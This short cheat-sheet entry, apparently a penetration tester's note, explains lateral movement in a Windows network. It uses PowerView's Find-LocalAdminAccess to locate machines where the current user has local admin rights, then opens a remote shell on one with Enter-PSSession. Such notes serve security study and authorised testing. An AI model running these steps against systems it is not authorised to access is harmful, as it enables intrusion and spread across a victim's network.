# Pivoting when we have local admin privs on other machines

When our current user have local administration privs on other machines we can spawn a shell on that box.

1. Find machines where our local user have local admin privs:

```bash
Find-LocalAdminAccess -Verbose #cmdlet from PowerView.

```
2. Use the built-in cmdlet "Enter-PSSession" to spawn a PS shell:

```bash
Enter-PSSession -ComputerName $COMPUTER_NAME 
```
